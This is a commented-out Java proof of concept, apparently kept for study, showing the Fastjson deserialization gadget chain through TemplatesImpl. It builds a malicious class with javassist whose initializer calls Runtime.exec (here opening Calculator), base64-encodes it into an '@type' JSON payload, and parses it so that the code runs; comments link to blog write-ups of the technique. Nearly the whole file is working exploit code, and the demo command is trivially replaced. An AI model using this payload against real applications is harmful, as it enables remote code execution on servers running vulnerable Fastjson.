// package com.iglens.json;
//
// import com.alibaba.fastjson.JSON;
// import com.alibaba.fastjson.parser.Feature;
// import com.alibaba.fastjson.parser.ParserConfig;
// import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
// import javassist.ClassPool;
// import javassist.CtClass;
// import org.apache.commons.codec.binary.Base64;
//
// /**
//  * 1.2以后有这个漏洞
//  *
//  * @link: https://www.cnblogs.com/akka1/p/16138460.html#autoid-3-0-0
//  * @link: https://blog.csdn.net/weixin_43263451/article/details/125862793
//  */
// public class FastJson利用链 {
//   public static class test {}
//
//   public static void main(String[] args) throws Exception {
//     ClassPool pool = ClassPool.getDefault();
//     CtClass cc = pool.get(test.class.getName());
//     String cmd =
//         "java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");";
//     cc.makeClassInitializer().insertBefore(cmd);
//     String randomClassName = "akka1" + System.nanoTime();
//     cc.setName(randomClassName);
//     cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
//
//     byte[] evilCode = cc.toBytecode();
//     String evilCode_base64 = Base64.encodeBase64String(evilCode);
//     System.out.println(evilCode_base64);
//     final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
//     String payload =
//         "{\""
//             + "@type\":\""
//             + NASTY_CLASS
//             + "\","
//             + "\""
//             + "_bytecodes\":[\""
//             + evilCode_base64
//             + "\"],"
//             + "'_name':'asd','"
//             + "_tfactory':{ },\""
//             + "_outputProperties\":{ },"
//             + "\""
//             + "_version\":\"1.0\",\""
//             + "allowedProtocols\":\"all\"}\n";
//     ParserConfig config = new ParserConfig();
//     Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);
//   }
// }
